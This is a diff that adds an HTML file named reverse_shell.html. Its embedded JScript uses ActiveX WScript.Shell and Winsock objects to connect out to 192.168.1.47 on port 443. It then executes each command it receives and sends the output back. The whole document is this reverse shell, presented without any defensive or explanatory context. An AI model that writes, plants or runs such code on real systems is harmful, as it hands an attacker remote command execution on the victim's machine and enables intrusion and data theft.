@@ -1,0 +1,31 @@
+<!-- reverse_shell.html -->
+<html>
+<script>
+var host = '192.168.1.47';
+var port = 443;
+var ws = new ActiveXObject('WScript.Shell');
+var conn = new ActiveXObject('MSWinsock.Winsock');
+conn.RemoteHost = host;
+conn.RemotePort = port;
+
+conn.Connect();
+
+conn.OnDataArrival = function(bytesTotal) {
+    var command = conn.GetData(8); // 8 = String type
+    try {
+        var output = ws.Exec(command).StdOut.ReadAll();
+        conn.SendData(output);
+    } catch (e) {
+        conn.SendData(e.message);
+    }
+};
+
+conn.OnConnect = function() {
+    conn.SendData("Connected\n");
+};
+
+conn.OnError = function(number, description) {
+    conn.SendData("Error: " + description + "\n");
+};
+</script>
+</html>
